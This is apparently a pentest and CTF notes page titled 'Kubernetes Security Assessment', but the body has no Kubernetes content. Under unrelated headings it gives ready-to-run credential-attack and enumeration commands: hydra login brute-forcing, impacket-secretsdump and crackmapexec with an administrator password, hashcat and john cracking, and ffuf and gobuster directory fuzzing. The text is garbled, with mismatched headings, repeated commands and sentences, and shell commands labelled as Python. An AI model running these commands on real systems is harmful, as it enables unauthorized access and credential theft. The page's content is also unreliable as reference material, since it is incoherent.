---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, oscp, enumeration, malware, lateral movement, networking"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-722.html"
URL_IMAGES: ""
Date: "2024-03-15"
Tags: "DFIR, OSCP, Enumeration, Malware, Lateral Movement, Networking"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-722"
Permalink: "/notes/note-kubernetes-security-assessment-722.html"
BtnLabel: "Read Notes"
Pick: 0
---
## PostgreSQL

### dcomexec

> **Note:** SeDebugPrivilege was identified as the primary attack vector in this scenario.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.64.93.12/FUZZ
```

## Nginx

### burpsuite

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.237.1
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.18.128 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.101.151.149 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## MSSQL

### DNS Rebinding

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

Initial enumeration revealed several interesting open ports on the target. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.17.246.62 -u administrator -p 'P@ssw0rd!' --shares
```

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.82.92 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.113.81.30 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.55.212.128/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

```powershell
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.41.99.236/FUZZ
```
